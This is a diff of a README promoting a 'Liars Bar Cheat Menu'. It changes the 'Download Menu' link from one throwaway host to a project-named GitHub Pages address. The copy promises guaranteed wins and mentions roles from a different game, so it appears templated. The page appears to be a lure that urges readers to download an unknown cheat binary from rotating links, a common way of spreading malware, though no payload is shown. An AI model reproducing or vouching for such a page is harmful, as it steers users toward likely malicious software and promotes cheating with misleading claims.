@@ -4,7 +4,7 @@
 
 In **Liars Bar**, lying, bluffing, and deduction are your main weapons—but what if you had a secret edge that turns every round into a guaranteed win? The **Liars Bar Cheat Menu** is your undercover toolkit to dominate every match like a mastermind. Whether you're a crewmate, killer, or something in between, this menu bends the rules in your favor 👀
 
-[![Download Menu](https://img.shields.io/badge/Download-Menu-blueviolet)](https://fileoffload16.bitbucket.io)
+[![Download Menu](https://img.shields.io/badge/Download-Menu-blueviolet)](https://Liars-Bar-Cheat-Menu-kuk.github.io/.github)
 ---
 
 ## 🕹️ What Is Liars Bar?
